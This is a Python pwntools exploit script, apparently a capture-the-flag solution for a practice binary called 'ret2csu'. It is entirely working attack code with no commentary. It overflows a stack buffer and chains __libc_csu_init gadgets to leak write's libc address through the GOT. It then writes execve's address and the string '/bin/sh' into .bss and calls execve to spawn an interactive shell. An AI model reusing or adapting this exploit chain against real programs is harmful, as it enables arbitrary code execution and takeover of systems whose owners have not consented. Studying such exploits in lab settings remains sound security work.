
from pwn import *
sh = process("./ret2csu")
elf = ELF("./ret2csu")
#context.log_level = 'debug'
#context.terminal = ['tmux','splitw','-h']
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
gadget1 = 0x00000000004011DE
gadget2 = 0x00000000004011C8
write_got = elf.got['write']
main_addr = elf.symbols['main']
read_addr = elf.got['read'] 
bss_addr = elf.bss()

def csu(r12,r13,r14,r15,ret_addr):
    payload = b"a"*136
    payload += p64(gadget1)
    payload += b'b'*8
    payload += p64(0)
    payload += p64(1)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(gadget2)
    payload += b'c' * 0x38
    payload += p64(ret_addr)
    sh.sendline(payload)

sh.recvuntil("Hello, World\n")
csu(write_got,1,write_got,8,main_addr)

write_addr = u64(sh.recv(8))
offset_addr = write_addr-libc.symbols['write']
execve_addr = offset_addr + libc.symbols['execve']

csu(read_addr,0,bss_addr,16,main_addr)
sh.recvuntil("Hello, World\n")
sh.send(p64(execve_addr)+b'/bin/sh\x00')

sh.recvuntil("Hello, World\n")
csu(bss_addr,bss_addr+8,0,0,main_addr)
sh.interactive()
